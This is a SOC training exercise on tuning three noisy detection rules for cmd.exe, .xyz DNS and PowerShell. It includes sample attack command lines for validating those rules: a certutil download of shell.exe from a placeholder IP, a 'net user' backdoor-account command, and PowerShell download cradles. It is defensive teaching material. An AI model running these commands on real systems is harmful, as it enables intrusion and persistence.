# Drill 02 (Intermediate): Alert Tuning Exercise

**Level:** Intermediate

**Estimated time:** 45 minutes

**Deliverable:** Tuned detection rule with documented justification and before/after metrics

---

## Background

You have inherited three detection rules from a previous analyst.
All three are generating unacceptable numbers of alerts.
Your task is to analyze the false positive patterns and tune each rule, documenting your reasoning for every change.

The key constraint: **you must preserve detection of real attacks**.
Validate your tuned rules against the provided attack simulation events.

---

## Rule 1: "Any Process Execution of cmd.exe" (847 alerts/day)

### Current Rule (SPL)

```splunk
index=security sourcetype=WinEventLog:Sysmon EventCode=1 process_name="cmd.exe"
| table _time, host, user, process_name, parent_process, command_line
```

### FP Analysis Data

Running this aggregation reveals the noise sources:

```text
count  parent_process                  typical_user
412    C:\Windows\explorer.exe         regular_users     ← user double-clicking
201    C:\Windows\System32\svchost.exe SYSTEM            ← Windows services
143    C:\Program Files\Git\git.exe    developers        ← Git for Windows
89     C:\Windows\System32\userinit.exe jdoe             ← Shell initialization
```

### Attack Events the Rule Must Still Catch

```csv
parent_process,command_line,user,host
C:\Windows\System32\winword.exe,"cmd.exe /c whoami",jdoe,PC01
C:\Users\jdoe\AppData\Local\Temp\invoice.exe,"cmd.exe /c powershell.exe -enc JABj",jdoe,PC01
C:\Windows\System32\wscript.exe,"cmd.exe /c net user administrator hacker123 /add",jdoe,PC01
C:\Windows\System32\mshta.exe,"cmd.exe /c certutil -urlcache -f http://203.0.113.1/shell.exe shell.exe",jdoe,PC01
```

### Your Tasks

1. Identify the **specific parent processes** responsible for most FPs
1. Write a tuned Sigma rule that excludes these FPs while keeping all 4 attack events
1. Explain why you chose NOT to exclude `explorer.exe` as a parent (hint: look at the attack events)

```yaml
title: Suspicious cmd.exe Execution (Tuned)
id: [GENERATE UUID]
# YOUR TUNED RULE
```

**Question:** What is the estimated alert reduction and estimated FP rate after your tuning?

---

## Rule 2: "DNS Query for Any .xyz Domain" (1,243 alerts/day)

### Current Rule (Sigma)

```yaml
title: Suspicious .xyz Domain Query
detection:
  selection:
    dns.question.name|endswith: '.xyz'
  condition: selection
level: medium
```

### FP Analysis Data

```bash
# Top .xyz domains queried in last 7 days
count    domain
8,234    cdn.example.xyz          ← company CDN (legitimate)
1,102    assets.shopify.xyz       ← Shopify partner domain (legitimate)
891      login.okta.xyz           ← Okta SSO (legitimate)
234      tracking.analytics.xyz   ← Marketing analytics tool
67       a1b2c3d4.randomdomain.xyz ← DGA-like (suspicious)
45       update.windowsxyz        ← Typo? Or malicious?
32       c2.badactors.xyz         ← Known C2 domain (malicious!)
12       exfil.dns.xyz            ← DNS exfiltration (malicious!)
```

### Your Tasks

1. Write a tuned Sigma rule that:
   * Whitelists known-good .xyz domains by your company
   * Detects DGA-like patterns (high entropy, random-looking subdomains)
   * Detects known-bad domains (you may reference a threat intel lookup)
   * Keeps detection for newly-seen .xyz domains not in whitelist

1. What additional enrichment would reduce FPs further without adding to the whitelist?

```yaml
title: Suspicious .xyz TLD DNS Query (Tuned)
id: [GENERATE UUID]
# YOUR TUNED RULE
```

---

## Rule 3: "PowerShell Execution by Any User" (2,105 alerts/day)

### Current Rule (SPL)

```splunk
index=security sourcetype=WinEventLog:Sysmon EventCode=1
  (process_name="powershell.exe" OR process_name="pwsh.exe")
| table _time, host, user, process_name, command_line
```

### FP Analysis Data

```text
Usage patterns by command_line content (top 10):
count  command_line_pattern
567    -NonInteractive -NoProfile -ExecutionPolicy Bypass -File C:\scripts\maintenance\*.ps1
398    -Command "Get-Service *"
301    -Command "Get-EventLog -LogName System -Newest 100"
198    -WindowsStyle Hidden -NonInteractive -EncodedCommand [SHORT-BASE64]   ← mixed
89     -enc [LONG-BASE64 >500 chars]                                         ← suspicious
67     Import-Module ActiveDirectory; Get-ADUser -Filter *                   ← may be IT or attacker
45     IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.1/')  ← malicious!
32     -nop -noexit -c "(New-Object Net.WebClient).DownloadFile(...)"        ← malicious!
28     -NonInteractive -EncodedCommand [VERY SHORT BASE64]                   ← likely benign
```

### Your Tasks

1. **Define a risk model**: Assign risk points to observable features:
   * Script file from known-good path vs unknown path
   * Encoded command (short vs long base64)
   * Download cradles (DownloadString, DownloadFile, IEX, Invoke-Expression)
   * Hidden window style
   * Bypass of execution policy
   * Suspicious parent process

1. Write a tuned SPL rule implementing the risk model, alerting only on total risk ≥ 50 points

1. Write the equivalent Sigma rule (use the `fields` based approach with scoring logic in a comment)

**Note:** Sigma doesn't natively support risk scoring within a single rule.
In your Sigma rule, focus on the highest-risk indicators that you'd use individually.

---

## Task 4: Tuning Documentation Template

Complete this tuning record for one of your three rules:

```markdown
## Alert Tuning Record

**Rule ID:** [UUID]
**Rule Name:** [Name]
**Analyst:** [Your name]
**Date:** [Date]

### Pre-Tuning Metrics
- Alert volume: ___ alerts/day
- Estimated FP rate: ___%
- True positives/day: ___
- Analyst investigation time/day: ___ hours

### FP Root Cause Analysis
[Describe the top 3 FP categories and their volume contribution]

### Tuning Changes Applied
1. [Change 1]: [Rationale]

2. [Change 2]: [Rationale]
3. [Change 3]: [Rationale]

### Post-Tuning Metrics (Estimated)
- Alert volume: ___ alerts/day (___% reduction)
- Estimated FP rate: ___%
- True positives/day: ___ (___% retention)

### Validation
- [ ] Rule tested against known-good attack simulation events
- [ ] All required attack events still trigger the rule
- [ ] Whitelist/exclusion list documented and approved

### Risks Introduced
[What attack patterns might now be missed? Accept or mitigate?]

### Review Date
[Schedule: typically 30 days after deployment]
```

---

## Submission Checklist

* [ ] Rule 1 tuned with attack event validation
* [ ] Rule 2 tuned with DGA detection
* [ ] Rule 3 risk model defined and implemented
* [ ] Tuning documentation template completed for at least one rule
* [ ] For each rule: stated estimated alert reduction percentage
